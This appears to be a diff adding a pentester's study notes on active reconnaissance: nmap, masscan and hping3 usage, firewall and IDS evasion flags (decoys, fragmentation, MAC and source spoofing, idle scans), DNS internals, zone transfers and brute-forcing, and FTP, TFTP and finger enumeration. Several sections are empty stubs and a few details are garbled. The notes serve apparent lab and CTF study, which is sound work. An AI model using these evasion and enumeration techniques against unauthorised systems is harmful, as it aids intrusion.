@@ -1,0 +1,2103 @@
+Active Information Gathering:
+============================
+Network & Host Enumeration:
+	Finding Hosts:
+		ARP Scanners:
+			Basics:
+				Working:
+					How do they work? and why they wont work on VPN?
+					Note:
+						They only work over Ethernert or WLAN networks. They wont work in case of VPN network.
+			NetDiscover:
+				Basics:
+					Its a simple ARP Scanner to scan for live hosts in a network
+					Modes:(2)
+						1. Passive Mode:
+							do not send anything, only sniff
+						2. Active Mode:
+				Usage:
+					netdiscover -i <interface>
+					Flags:
+						-i => interface
+						-r 10.10.10.0/24 => range
+						-p => passive mode
+			arp-scan:
+				Basics:
+					Fast ARP Scanner to scan for live hosts in a network
+				Usage:
+					arp-scan --local
+					Flags:
+						--local => --localnet =>
+						--interface => specify interface
+		Nmap:
+			nmap -sn xxx.xxx.xxx.xxx/yy | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
+			Note:
+				Read Nmap section to understand better.
+	Port Scanners:
+		Note:
+			For better understanding, read TCP Flags Section of Networking Sheet beforehand.
+		Basics:
+			Port Scanning:
+				Basics:
+				Scan Types:
+					TCP SYN Scan:(aka SYN Scan)
+						Basics:
+							This is the most popular scan as its quick and accurate. 
+						Working:
+							Port scanner send the SYN packet to open communication and then wait. If a "SYN-ACK" is recieved, then port is open, else if "RST" packet is recieved, port is closed. If port scanner gets no response, then the port is "filtered."
+					UDP Scan:
+			Bypassing Firewall:
+				Basics:
+					A firewall blocks the port scanner from scanning the host. 
+				Enumeration:
+					Confirming Presence of Firewall:
+						Ping:
+							ping <host>
+							If we cannot ping the host, but the host is active(For example, a website may be active, but we cannot ping it), then it confirms presence of a firewall.
+						Traceroute:
+							traceroute <host>
+							If output shows only "*", then it confirms presence of a firewall.
+						Port Scanners Output:(Nmap/etc)
+							If their output show "ALL PORTS ARE FILTERED", then it confirms presence of a firewall.
+				Bypass Techniques:
+					Fragmentation:
+						Basics:
+							In this technique, attacker splits data packets into several smaller fragments, before sending them to target network.
+						Cons:
+							Most mordern IDS are configured to rebuild fragmented packets.
+					Appending Data:
+						Basics:
+							In this technique, attacker appends random data at end of data packets thus hindering firewall detections.
+					Decoy:(aka IP Address Decoy)
+						Basics:
+							In this technique, attacker send data packets from multiple IPs, making it really difficult for firewall to determine actual source of data packets.
+					Packet Size:(MTU(Maximum Transmission Unit))
+						Basics:
+							In this technique, attacker changes the frame or packet size, thus causing confusion for firewall.
+					Idle Scan:(aka Idle Zombie Scan)
+						Basics:
+							In this attack, attacker uses host_b to scan host_a.
+						Pros:
+							Stealth
+							Since, both hosts are on same network, firewall rules aren't that strict.
+					Scan Port:
+						Basics:
+							Sometimes, firewalls only implement rules on some very specific ports and leave some ports like 53(DNS) out of those rules. In this technique, attacker uses such ports to send scanning probes.
+						Most commonly allowed ports:
+							20
+							53
+							67
+					MAC Spoofing:
+						Basics:
+							In this technique, an attacker spoofs the MAC address, as somee firewalls have MAC-based filtering in place.
+		Nmap:(Network Mapper)
+			Basics:
+			Usage:
+				Port Scanning:				
+					Useful one-liners:
+						1. nmap -p- <host> -oA all_ports
+						2. nmap -p port1,port2 -sCV --script=vuln <host> -oA port_scan
+						3. nmap -sU <host> -oA udp_ports
+					Passing Host:
+						IPv4:
+							nmap <flags> <subnet> => Scanning Subnet
+							nmap <flags> 10.10.10.0-115 => Scanning IP Range
+							nmap <flags> -iL ip.txt => Scanning using list of IP
+						IPv6:
+							nmap <flags> -6 <subnet> => Scanning Subnet
+							nmap <flags> -6 start_ip-End_ip => Scanning IP Range
+							nmap <flags> -6 -iL ip.txt => Scanning using list of IP
+						Domains:
+							nmap <flags> abcd.site
+					Flags:
+						--traceroute => Trace hop path to each host
+						Scan Time:
+							-Tx => Adjust packet/second speed.
+								-T0 => Paranoid Mode
+									Used to avoid IDS. Very slow, sends one packet every 5 mins.
+									No parallel packets are sent
+								-T1 => Sneaky Mode
+									A packet is sent every 15 seconds
+									No parallel packets are sent
+								-T2 => Polite Mode
+									This mode is useful in case of networks with low banwidth
+									A packet is sent every 0.4 seconds
+									No parallel packets are sent
+								-T3 => Normal Mode (default)
+								-T4 => Aggressive Mode
+									A packet is sent every 10 milliseconds
+									It waits for only 1.25 seconds to get a response back for its reponse.(default time to wait for a probe is 9 seconds.)
+									Parallel scanning is enabled
+								-T5 => Insane Mode
+									A packet is sent every 5 milliseconds
+									It only waits 0.3 seconds to get a response for its probes
+									It spends only 15 mins per target.
+									This mode should not be used when are scanning a large range of ports or UDP ports as it only spends 15 mins per target which is a very less time if we wanna scan a target with many open ports.
+									This mode is recommened for fast networks.
+						Output:
+							-oA outputfile => Created output files in all supported file formats.						
+						Specify Hosts:
+							-6 => IPv6 IP
+							-iL => IP List
+						Specify Ports:
+							-p port1, port2 => Specifying ports
+							-p- => All Ports
+							-F => Fast Scan(Scan first 100 common ports)
+							--top-ports=x
+						Scan Type:
+							-sS => SYN Scan
+							-sA => ACK Scan
+							-sF => Fin Scan
+							-sX => Xmas Scan
+							-sN => TCP Null Scan
+							-sU => UDP Scan
+							-sC => Default Scripts
+							-sV => Enumerate Versions
+							-sT => TCP Scan(by Default)
+							-O => OS fingerprinting. (Not recommended due to false positives)
+							-A => -O + -sV + -sC + --traceroute
+					NSE:(Nmap Scripting Engine)(/usr/share/nmap/scripts)
+						nmap --script-help <scriptname> => get help about any script
+						nmap <ip> --script=scriptname => Use the specified script
+						Important Scripts:
+							General:
+								--script=safe => tells nmap to only run scripts if it seems safe against the target
+								--script=vuln
+								--script=exploit
+							Bypass Firewall:
+								Read Stealth Related Section above
+				Bypassing Firewall/IDS/IPS:
+					Note:
+						For Basics, Read Basics Section above.
+					General Tips:
+						Using -T0 or -T1
+					Decoy:
+						nmap -D RND:<x> <host> => Send data packets from 'x' random decoys IPs
+						nmap -D <decoy_ip_1>,<decoy_ip_2> <host> => Send data packets from specified decoy IPs
+					Specifying MTU:
+						nmap --mtu <x> <host> => Send packets of 'x' size. (x is multiple of 8)
+					Fragmentation:
+						nmap -f <host>
+					Appending Data:
+						nmap --data-length <x> <host> => Append 'x' amount of bytes to every data packet. (x can be any number)
+					Idle Scan:(aka Idle Zombie Scan)
+						nmap -sI <zombie_ip> <host> => Perform Idle Zombie Scan
+					Change Scan port:
+						nmap --source-port <x> <host>
+					MAC Spoofing:
+						nmap --spoof-mac <x> <host>
+					Flags:
+						-D => Send Decoys
+							-D RND:<x> => Send data packets from 'x' random decoys IPs
+							-D <decoy_ip_1>,<decoy_ip_2> => Send data packets from specified decoy IPs
+							Note:
+								-D is not compatible with -sT and -sV
+						-f => Fragment data packets before sending.
+							Note:
+								-f is not compatible with -sT and -sV
+						--mtu <x> => Send packets of size 'x'
+							Note:
+								x is always a multiple of 8
+						--data-length <x> => Append 'x' amount of bytes to every data packet. (x can be any number)
+						-sI => Idle Scan
+						-g <x> => --source-port <x> => Send scanning probes using port 'x'
+						--spoof-mac <x> =>
+							x=Dell/Apple/3Com => Specify vendors via name
+							x=0 => Random
+							x=<MAC Address> => Specify exact address to spoof.
+						-Pn => Doubt(Usage of -Pn with -sI)
+						-n => Dont perform DNS Resolution to decrease noise.
+						-b =>
+						-sN => 
+						-sF => 
+						-sX => 
+						-sA =>
+						-sO => 
+					Firewall-related NSEs:
+						Note:
+							For Basics, read NSEs under Port Scanning Section above.
+						--script firewall-bypass => 
+		Masscan:(apt install masscan)
+			Basics:
+				Used in large networks
+				Issue:
+					It only allows IPv4 as input, not domain_name or IPv6.
+			Usage:	
+				masscan -p80-8000 --rate=150000 -e tan0 --router-ip gateway_ip -oL output.txt
+				Flags:
+					-p => Specify ports
+						-p<x>-<y> => 
+					--router-ip => 
+					--rate => Packet/second speed
+					-oL => List output
+					-e <interface> => Specify interface
+		DNSMasscan:(https://github.com/rastating/dnmasscan)
+			Basics:
+				It takes domains.txt => coverts it to ip => feed those ip's to masscan
+			Usage:
+				dnsmasscan domains.txt dns.log -p1-65535 -oG masscan.log
+				Flags:
+					-p => 
+					-oG => 
+					dns.log => log file having domains and ip's they resolve to
+					masscan.log => results of masscan
+		Hping3:
+			Basics:
+				Hping3 can send custom ICMP/UDP/TCP packets and can display target replies(like "ping" do).
+				It can handle fragmentation and arbitrary packet body and size, and can be used to transfer files under supported protocols.
+				Its used to test firewall rules, perform (spoofed) port scanning, test network performance using different protocols, do path MTU discovery, perform traceroute-like actions under different protocols, fingerprint remote operating systems, audit TCP/IP stacks, etc.
+				Its also scriptable using the Tcl language.
+				Note:
+					Name of tool is "Hping3", and not "Hping"
+			Usage:
+				ICMP Scan:
+					hping3 -1 <host> => Hping3 will act like 'ping' command, sending icmp-echo and recieving icmp-reply
+					hping3 -traceroute -1 <host> => 
+				TCP Scan:
+				hping3 <host> => Sends a TCP null-flags packet to port 0 of target every second.
+				Flags:
+					General Flags:
+						<host> => Can be domain_name or IPv4
+						-p <x> => Port(By default, x is '0') to send packets on
+						-s <x> => Port to use to send packets to host
+						-c <x> => Send 'x' packets only
+						-i => --interval => Wait for specified time in between sending packets.
+							-i u<x> => wait 'x' microseconds
+							-i <x> => wait 'x' seconds
+						--fast => It is same as "-i u10000", ie, it will send 10 packets per second.
+						--faster => It is same as "-i u1"
+						--flood => It is same as "-i u0", ie, it will send packets as fast as possivle.
+						-T => --traceroute => 
+					-0 => Enable RAW IP Mode. In this mode, hping3 will send IP header along with data?
+						Raw IP Mode Flags:(-0)
+							-a => --spoof => Spoof source address
+					-1 => Enable ICMP Mode. 
+						ICMP Mode Flags:(-1)
+							-C => --icmptype => 
+					-2 => Enable UDP Mode.
+						UDP Mode Flags:(-2)
+							Same as TCP Mode Flags.
+					-8 => Enable Scan Mode.
+						Scan Mode Flags:(-8)
+					-9 => Enable Listen Mode.
+						Listen Mode Flags:(-9)
+					<nothing> => Enable TCP Mode(Default Mode)
+						TCP Mode Flags:
+							-F => --fin => Set FIN tcp flag.
+							-S => --syn => Set SYN tcp flag.
+							-R => --rst => Set RST tcp flag.
+							-A => --ack => Set ACK tcp flag.
+							-U => --urg => Set URG tcp flag.
+							-X => --xmas => Set Xmas tcp flag.
+							-Y => --ymas => Set Ymas tcp flag.
+			Scripting:
+		Nping:
+			Basics:
+			Usage:
+				Flags:
+PPS:(Port, Protocols & Services)
+	Basics:
+		Note:
+			Whenever we find a new protocol:
+				google "RFC <protocol_name>"	
+	Important PPS:
+		General PPS:
+			FTP(21):(File Transfer Protocol)
+				Understanding FTP:
+				Enumeration:
+					Nmap:
+						nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <ip>
+					FTP:(Binary)(apt-get install ftp)
+						Basics:
+							Modes:(2)
+								A. Binary:
+									Using BINARY Mode to only upload binary files,otherwise, the file will become corrupted.
+								B. Ascii:
+									Using ASCII Mode to only upload ascii files, otherwise, the file will become corrupted.
+						Usage:
+							Connecting to FTP:
+								ftp <ip>
+									username:<value>
+									password:<value>
+								Anonymous Login:
+									ftp <ip>
+										username:anonymous
+										password:anonymous
+							Meta Commands:
+								binary => Enables BINARY FTP Mode
+								ascii => Enables ASCII FTP Mode
+								put file_name => to upload a file
+								get file_name => to download a file
+								mget * => To download all the files and directories
+								Note:
+									mget means "multiple get" and it's used to download multiple files.
+			DNS(53):(Domain Name System)(aka DNS System)
+				Understanding DNS:
+					Basics:
+						Terms:
+							Host:(aka Host-Name)
+								Read Networking Sheet.
+							FQDN:(Fully Qualified Domain Name)
+								Read Networking Sheet.
+							TTL:(Time To Live)
+								Read Networking Sheet.
+							Internet:
+								Read Understanding Internet Sheet.
+					Understanding Do53 & TCP/Do53 Protocols:(Understanding standard DNS Protocol)
+						Basics:
+							DNS is a Layer 7(Application Layer) protocol of TCP/IP model.
+							DNS is a "Hierarchical" and "Decentralized" "Naming System" used to identify resources reachable through TCP/IP based network.
+								Hierarchical:
+									DNS is a Hierarchically Distributed Database, ie, DNS has layers which are arranged in a defined order and the data is distributed across a wide range of machines.
+								Decentralized:
+								Naming System:
+							Ports:
+								Do53 => DNS-over-UDP/53
+								TCP/Do53 => DNS-over-TCP/53
+							Note:
+								DNS is not just a way to convert IP address to domain name and vice-versa.
+						Domain Name System Protocol has 2 components:
+							A. DNS Client:
+								Basics:
+									DNS Client refers to a program that uses the host-name of a remote computer or resource(like a network printer, etc) to contact it.
+									For Example => web browsers, etc.
+								Types:
+									Client-only:
+									Client-Sever:
+							B. Domain Name System Itself:
+								Domain Name System Structure:
+									Components:(3)
+										A. Domain Name:(aka Domain)
+											Basics:
+												Domain Name is an identification string that attached with an IP Address.
+												For example => google.com
+											Domains Names are organized as a set of branches descending from a root, just like a Tree data structure.
+										B. Domain Name Space:(aka Namespace)(aka Name Space)(aka Domain Name Structure)
+											Basics:
+											Namespace Types:(2)
+												1. Flat Namespace:
+												2. Hierarchical Namespace:
+													Basics:
+														A Hierarchical Domain Name Space is represented as an Inverted tree structure with multiple levels(from 0 to 127).
+													Hierarchy:
+														Root Level:
+															TLD:(Top Level Domain)
+																Types:
+																	Generic TLDs:(aka Organizational TLDs)
+																		A. .com
+																		B. .edu
+																		C. .gov
+																		D. .int
+																		E. .mil
+																		F. .net
+																		G. .org
+																	Country TLDs:(aka Geographical TLDs)
+																		in, au, us, uk, fr, etc.
+														Branches and Sub-Branches Level:
+															Every Branch is a Domain and every Sub-Branch is a Sub-Domain.
+															Parent Branch:
+																It refers to the first branch after the root level.
+															Sub-Domain:
+																Example => adwords.google.com
+														Note:
+															For reference, see this image:
+													DNS Class:
+														Basics:
+														Types:(3)
+															A. IN:(Internet Class)
+															B. CH:(Chaos Class)
+															C. HS:(Hesiod Class)
+											DNS Zones:(aka Zones)
+												Basics:
+													Domain Name Space is divided in groups called DNS Zones.
+												Types:(2)
+													DNS Zones are of two types depending on which NS they reside in.
+													A. Master Zones:(aka Primary Zones)
+													B. Slave Zones:(aka Secondary Zone)
+												Both Primary and Secondary NS have 2 Zones for their Domain:
+													A. Forward Lookup Zone:
+														Its used to provide IP address of a given name.
+													B. Reverse Lookup Zone:(aka Reverse Mapping Zone)
+														Its used to provide name of a given IP address.
+														Usages:
+															1. It is used by Mail Severs to prevent spamming.
+												Zone File:
+													Basics:
+														A Zone File may get divided among different Name Servers of differenet Zones due to its large size.
+														Zone File is a text file containing:
+															A. DNS Records:
+																Basics:
+																	DNS Record refers to a simple mapping between a domain name and its IP Address.
+																Types:(2)
+																	1. RRs:(aka Resource Records)
+																		Basics:
+																			DNS RRs contain all DNS information.
+																		Important Types:(17)
+																			A. A Record:(aka IPv4 Address Mapping Record)(aka IPv4 Record)
+																				Basics:
+																					A Record contains mappings between domain names and their respective IPv4 addresses
+																			B. AAAA Record:(aka IPv6 Address Mapping Record)(aka IPv6 Record)
+																				Basics:
+																					AAAA Record contains mappings between domain names and their respective IPv6 addresses
+																			C. CAA Record:(aka Certification Authority Authorization Record)
+																			D. CERT Record:(aka Certificate Record)
+																			E. CNAME Record:(aka Canonical Name Record)
+																				Basics:
+																					CNAME contains alias of domain.
+																			F. DNAME Record:(aka Delegation Name Record)
+																			G. DNSKEY Record:(aka DNS Key Record)
+																			H. CDNSKEY Record:
+																				Basics:
+																					Child copy of DNSKEY record, for transfer to parent.
+																			I. PTR Record:(aka Pointer Record)
+																				Basics:
+																					PTR Record is used in reverse lookup zone and is used to find the records associated with an IP address.
+																			J. NS Record:(aka NameServer Record)(aka Name Server Record)
+																				Basics:
+																					NS Record contain the name of authoritative servers hosting DNS records for a domain
+																			k. MX Record:(aka Mail eXchanger Record)(aka Mail Exchange Record)
+																				Read Mail Exploitation Sheet.
+																			L. KX Record:(aka Key Exchanger Record)
+																			M. LOC Record:(aka Location Record)
+																			N. SIG Record:(aka Signature Record)
+																			O. TXT Record:(aka Text Record)
+																				Basics:
+																					TXT Record can contains any data that domain admin wanna associate to the domain. It is used for various reasons.
+																				Sub-Types:
+																					E-Mail DNS Records:(DNS Records created by Sender's Mail Server)
+																						SPF TXT Record:
+																							Read Mail Exploitation Sheet
+																						DKIM TXT Record:
+																							Read Mail Exploitation Sheet
+																						DMARC TXT Record:
+																							Read Mail Exploitation Sheet
+																			P. SOA Record:(aka Start of Authority Record)(aka Start of a zone of Authority Record)
+																				Basics:
+																					SOA Record must be present in the Zone File.
+																				Contents:
+																					The primary NS
+																					The responsible party for the domain (admin.website.com).
+																					A timestamp that changes whenever domain updates.
+																					The number of seconds before the zone should be refreshed.
+																					The number of seconds before a failed refresh should be retried.
+																			Q. SRV Record:(aka Service Record)
+																	2. Pseudo-RRs:
+																		Basics:
+																			These records either provide some type of information or they are experimental features.
+																		Types:(4)
+																			A. * Record:(aka All Cached Records)
+																				Basics:
+																			B. AXFR Record:(aka Authoritative Zone Transfer Record)
+																				Basics:
+																					AXFR Record is used to transfer entire zone file from the primary name server to secondary name servers.
+																			C. IXFR Record:(aka Incremental Zone Transfer Record)
+																				Basics:
+																			D. OPT Record:(aka Option)
+																				Basics:
+																					This is a pseudo-record type needed to support EDNS protocol.
+																Note:
+																	Since DNS Records are stored in a zone file(text file), so clearly, DNS Records are TEXT-based files.
+															B. Glue Data:
+																Basics:
+																	Glue Data connects a Zone File to other DNS Servers
+													Zone File Structure:
+														Contents:
+															1. Directives:
+																Basics:
+																	Directives begin with a "$"
+																Types:(3)
+																	A. $TTL:
+																		Time To Live value for the Zone.
+																		It must appear at the begining of Zone File.
+																	B. $ORIGIN:
+																		It defines Base Name used in Domain Name substitution.
+																	C. $INCLUDE:
+																		It includes a file.
+															2. RRs:(aka Resource Records)
+													Note:
+														DNS Servers can have more than 1 zone file.
+												DNS Zone Hierarchy:
+													1. DNS Root Zone:(aka Root Zone)
+													2. 
+												Zone Transfer:
+													Basics:
+														Zone Transfer is a process in which DNS Primary NS sends a copy of Zone File to DNS Secondary NS.
+												Zone Delegation:
+										C. Domain Name Server:(aka DNS Server)(aka Name Server)(aka NameServer)(aka NS)
+											Basics:
+												NS is a sever specialized in handling queries regarding location of a domain.
+											Types:(4)
+												1. DNS Resolver:(aka Recursive Resolver)(aka DNS Recursive Resolver)(aka DNS Recursor)
+													DNS Recursor is a server specifically designed to receive DNS Queries from client machines through applications such as web browsers, so its also the first step in DNS Lookup Process. 
+													Once it recieves the DNS Query from client, it either:
+														A. Responds with cached data
+														B. Send a request to a Root NS followed by another request to a TLD NS and then a request to an Authoritative NS. During this process, this server will cache all information recieved from Authoritative NS. 
+													Note:
+														Mostly internet users are provided a DNS Resolver provided by their ISP. Elsewise, there are other DNS Resolvers to choose from.
+												2. DNS Root Server:(aka Root NameServer)(aka Root Server)
+													Root NS is the top level server which consists of the entire DNS tree. It does not contain the information about domains but, it serves as a reference to other DNS Servers.
+													DNS Lookup process starts by sending query DNS NS.
+												3. DNS TLD server:(aka TLD NameServer)(aka Top Level Domain NS)
+													TLD NS is the second step in the DNS Resolution process.
+													It hosts the last portion of a hostname, ie, the TLD.
+												4. DNS Authoritative Nameserver:(aka AuthNS)(aka Authoritative NameServer)
+													Basics:
+													Types:(2)
+														A. Primary NS:(aka Primary Server)(aka Master NS)(aka Master Server)
+															Primary NS holds all the information about its Domain in a file called "Zone File".
+														B. Secondary NS:(aka Secondary Server)(aka Slave NS)(aka Slave Server)
+															Secondary NS is setup to act as a backup in case of Primary NS faliure.
+															It can act as backup of Primary NS because it contains a copy of "Zone File" which is provided to it by Primary NS on a regular basis under normal conditions using a process callled "Zone Transfer".									
+								NameServer Query:
+								DNS Messages:
+									Types:(2)
+										A. DNS Query:
+											Types:(2)
+												1. Recursive Query:
+													Recursive queries are generally used by DNS Clients and they specifically instruct the DNS Server to respond only with an answer and not a Referral Response.
+												2. Non-Recusive Query:(aka Iterative Query)
+													Iterative queries are used by DNS Servers only and specifically instruct the other DNS Server to return an answer or return the address of another DNS server that may know the answer to the DNS Query.
+										B. DNS Reply:(aka DNS Response)
+											Types:
+												1. Referral:
+													Referral is a DNS Response that imparts that a DNS Server do not know the answer to DNS Query, but another DNS Server having <ip address> may know the answer.
+									Note:
+										Usually UDP is used for both DNS Queries and DNS Responses because UDP is fast and has low overhead. However if a DNS Response is larger than 512 bytes, then TCP is used because of TCP's ability to check for data integrity.
+									Message Format:
+										Note:
+											Both DNS Query and DNS Reply have same format.
+										Sections:(5)
+											1. Header Section:
+												Fields:(4)
+													Each field is 16 bits long, and appears in the following order:
+														1. Identification:
+															It is used to match response with queries.
+														2. Flags:
+															It contains the following sections in exact given order:
+																A. QR:
+																	It indicates if the message is a query or a reply
+																	Length => 1 bit
+																	Value:
+																		0 => Query
+																		1 => Reply
+																B. OPCODE:
+																	It identifies type of query.
+																	Length => 4 bits
+																	Value:
+																		0 => QUERY => Standard Query 
+																		1 => IQUERY => Inverse Query
+																		2 => STATUS => Server status request
+																C. AA:(Authoritative Answer)
+																	In a response, it indicates if the DNS server is authoritative for the queried hostname1
+																	Length => 1 bit
+																D. TC:(TrunCation)
+																	It indicates that this message was truncated(shortened) due to excessive length
+																	Length => 1 bit
+																E. RD:(Recursion Desired)
+																	It indicates if the client means a recursive query
+																	Length => 1 bit
+																F. RA:(Recursion Available)
+																	In a response, it indicates if the replying DNS server supports recursion
+																	Length => 1 bit
+																G. Z:(Zero)
+																	It is reserved for future use
+																	Length => 3 bits
+																H. RCODE:
+																	It tells the Response code.
+																	Length => 4 bits
+																	Value:
+																		0 => NOERROR
+																		1 => FORMERR => Format error
+																		2 => SERVFAIL
+																		3 => NXDOMAIN => Nonexistent domain
+																		Etc.(https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-6)
+														3. Number of Questions:
+														4. Number of Answers:
+														5. Number of Authority RRs:
+														6. Number of Additional RRs: 
+											2. Question Section:
+												It contains the domain name and type of record being resolved.
+											3. Answer Section:
+												It contains the RR for the queried name.
+											4. Authority Section:
+											5. Additional Space Section:
+								DNS Translation:(aka DNS Resolution)(aka DNS Name Resolution)(aka Name-to-Address Resolution)(aka DNS Mapping)
+									Basics:
+										DNS translates domain names(for example mynew-domain.local) to IP addresses(both IPv4 and IPv6) for TCP/IP Networks.
+									DNS Lookup:
+										Basics:
+											DNS Lookup refers to the process via which DNS Lookup process is performed.
+											DNS Lookup refers to process via which Domain Name System searches for the requested DNS Record and returns it to the client. 
+										Types:(2)
+											A. Iterative DNS Lookup:
+												Here, the client communicates directly with each DNS server involved in the lookup.
+											B. Recursive DNS Lookup:(aka Recursive DNS)
+												Here, a DNS server communicates with several other DNS servers to hunt down an IP address and return it to the client.
+										Steps:
+											Step-1:
+												Client(For example browser) creates a DNS Query 
+											Hostname in browser -> Computer DNS(Local DNS) -> External DNS(DNS Recursor) -> one of the servers in the DNS Root Zone -> Root server gives name of the server responsible for the zone containing TLD -> DNS Recursor asks that Zone Server for Authoritative NS
+									DNS Caching:
+										Basics:
+											Terms:
+												Cache:
+													Cache is a temporary store in layman terms.
+												Caching:
+													It is the process of temporarily storing data locally.
+											DNS Servers and Clients cache DNS Lookup data to be able to quickly resolve a DNS Lookup if it is already stored in the cache.
+										Advantages:
+											1. DNS Caching reduces the load on Root DNS Server.
+								DDNS:(Dynamic DNS)
+									Basics:
+						DNS Implementations:
+							BIND:
+					Understanding DNS-Based Protocols:
+						DNSCrypt:
+							Port => TCP/53 & UDP/53
+						DoT:(DNS over TLS)
+							Port => TCP/853
+						DoH:(DNS over HTTPS)
+							Port => TCP/443
+						ODoH:(Oblivious DNS over HTTPS)
+						DNS over TOR:
+						EDNS:(Extension Mechanisms for DNS)
+				Enumeration:
+					If DNS is running on TCP/53:
+						Perform Zone transfer to get Zone File:
+							Steps:
+								Step-1: Zone Transfer:(First we try zone transfer)
+									A zone transfer is a database replication in which the zone file is copied from a master server to a slave server. Zone transfers should only be allowed to authorized slave DNS servers but many are misconfigured so, anyone asking for a copy of zone file will usually receive one.
+									it only works on DNS-TCP
+										dig @ip -t axfr domain_name
+										dig axfr domain_name @ip
+								Step-2: When Zone Transfer fails:
+									A. DNS bruteforce:
+										nmap --script=dns-brute <domain> --script-args=dns-brute.hostlist=/opt/dnsrecon/namelist.txt
+									B. Reverse DNS scan:(PTR)
+										msfconsole:
+											use auxiliary/gather/enum-dns
+											set domain <domain>
+											set ENUM_RVL true
+											set IPRANGE ip/24
+											run
+					Resolving domain name in AD:
+						nslookup:	
+							nslookup
+							>server ip
+							>127.0.0.1
+							>127.0.0.2
+							>ip
+						dig:
+							dig @ip gussed_domain_name.local
+					Finding IPv6 using nslookup:
+						nslookup
+						> server <ip of host>
+						> FQDN(Fully qualified domain name)(example: site.htb.local) => this will return IPv6
+				Tool Explanantion:
+					HOST:
+						Basics:
+							It is used to peform DNS Lookups.
+						Usage:
+							Flags:
+								-a => ANY/all Records
+								-v => ANY/all Records
+					DIG:(aka Domain Information Groper)
+						Basics:
+							It is used to peform DNS Lookups. It is based on BIND 9 DNS implementation.
+						Usage:
+							dig @server#port Name Query_type => Forward DNS Lookup
+								Examples:
+									dig google.com => Perform Forward DNS Lookup for A Record
+									dig @8.8.8.8 google.com => Perform Forward DNS Lookup for A Record from 8.8.8.8 NS
+									dig @8.8.8.8 google.com AAAA => Perform Forward DNS Lookup for AAAA Record from 8.8.8.8 NS
+									dig @8.8.8.8#6653 google.com AAAA => Perform Forward DNS Lookup for AAAA Record from 8.8.8.8 NS running DNS on port 6653
+							dig -x addr => Reverse DNS Lookup
+								Examples:
+									dig -x 172.158.28.14
+							Flags:
+								Name:(Non-Optional)
+									Name of domain/resource or IP address to be looked up
+									Name of domain/resource or IP address to which the query is directed at
+								@server#port:(Optional)
+									server => ip(IPv4 or IPv6) of NS
+									port => optional(by default => 53)
+								query_type:<Record_type>
+									Type of record to access via query
+									Values:
+										A => IPv4 address(Default value)(In UPPERCAPS)
+										AAAA => IPv6 address(In UPPERCAPS)
+										ANY => Any Record(In UPPERCAPS)
+										MX => Email sever hostnames(In UPPERCAPS)
+										PTR => Pointer to alias(In UPPERCAPS)
+										SOA => Authorative information(In UPPERCAPS)
+										TTL => (In UPPERCAPS)
+										txt => Text Record (In lowercaps)
+										cname => Alias(In lowercaps)
+										ns => Nameserver names(In lowercaps)
+										AXFR => To request a Zone transfer(In UPPERCAPS)
+								addr => IPv4 or IPv6 address for Reverse DNS Lookup
+								-4 => Forces dig to make only IPv4 query
+								-6 => Forces dig to make only IPv6 query
+								-b => Another way to specify NS address(IP only)
+								-p => Another way to specify NS port(by default => 53)
+								-x => Reverse Lookup
+								-c => 
+								-q => 
+								-t=<value>:
+									Another way to specify type of record to access via query
+									Values:
+										A => IPv4 address(Default value)(In UPPERCAPS)
+										AAAA => IPv6 address(In UPPERCAPS)
+										ANY => Any Record(In UPPERCAPS)
+										MX => Email sever hostnames(In UPPERCAPS)
+										PTR => Pointer to alias(In UPPERCAPS)
+										SOA => Authorative information(In UPPERCAPS)
+										TTL => (In UPPERCAPS)
+										txt => Text Record (In lowercaps)
+										cname => Alias(In lowercaps)
+										ns => Nameserver names(In lowercaps)
+										AXFR => To request a Zone transfer(In UPPERCAPS)
+								+trace => It makes queries "Iterative" and shows all DNS Severs the query went through
+								+short => It shows a short version of output.
+								+answer => 
+					NSLookup:(Name Server Lookup)
+						Basics:
+							It is used to peform DNS Lookups. It is based on BIND 9.3 DNS implementation.
+							Difference between NSLookup and DIG?
+								Unlike dig, nslookup does not use OS's local DNS resolver library to perform its queries.
+							Modes:(2)
+								1. Interactive Mode:
+									Instead of using arguments, just "nslookup" command is typed on console followed which leads to an interactive-console session in which commands are typed according to the purpose of usage.
+								2. Argument Mode:
+									Arguments are provided using flags.
+						Usage:
+							A. Interactive Mode:
+								nlookup => First command to start the interactive-console session.
+								Commands:
+									host <value> => 
+									server <value> => 
+									lserver <value> => 
+									set <keyword>=<value>
+										Keyword:
+											type=<value> => type of RR
+												Values:
+													any
+													soa
+													mx
+													ns
+									exit => to exit
+									IN
+									CH
+									HS
+									ANY
+							B. Argument Mode:
+								nslookup domain_name => Forward DNS Lookup for A Record
+								nslookup IP => Reverse DNS Lookup for A Record
+								nslookup <ip or domain_name> <dns_server> => Perform a DNS Lookup for <ip or domain_name> using <dns_server> server
+								Flags:
+									-type=<value> => Type of RR
+										Values:
+											any
+											soa
+											mx
+											ns
+									-port=<value> => DNS port(default value => 53)
+			TFTP(UDP/69):(Trivial File Transfer Protocol)
+				Understanding TFTP:
+					TFTP is installed by default on:
+						Windows XP
+						Windows Sever 2003
+				Enumeration:
+					Connecting to a TFTP Server:
+						TFTP:(Binary)
+							Basics:
+								Installation:
+									apt install atftpd
+									chown nobody:nogroup /tftp
+							Usage:
+								tftp -i 10.0.0.1 PUT file.exe => transfer file from windows to kali
+								Flags:
+									-i <ip>
+								Meta-Commands:
+									send => Send single file
+									put => Send one file.
+									mput => Send multiple files.
+									mget => Get multiple files.
+									get => Get file from the remote computer.
+									ls => list 
+									mget * => Download everything
+									binary => Switches to binary transfer mode.
+									ascii => Switch to ASCII transfer mode
+					Using Nmap:
+						nmap -sU -p 69 --script tftp-enum.nse $ip
+				Exploitation:
+					Vulnerable Versions => 1.3, 1.4, 1.9, 2.1, and a few more
+			Finger:(79)
+				Understanding Finger:
+					Finger protocol is used in Solaris OS.
+				Enumeration:
+					finger-user-enum.pl:(https://github.com/pentestmonkey/finger-user-enum)
+						Basics:
+							It can used to enumerate what users are currently logged in.
+						Usage:
+							./finger-user-enum.pl -U users.txt -t <ip>
+							Flags:
+								-t => ip
+								-U => users.txt
+									User Wordlist:
+										/usr/share/seclists/Usernames/Names/names.txt
+										/usr/share/metasploit-framework/data/wordlists/unix_users.txt
+				Used in HTB::Sunday
+			Kerberos(88):
+				Read Windows Internals Sheet
+			RPCBIND(111):(aka Portmapper)
+				Basics:
+					Read RPC Section of Windows Internals Sheet
+					Note:
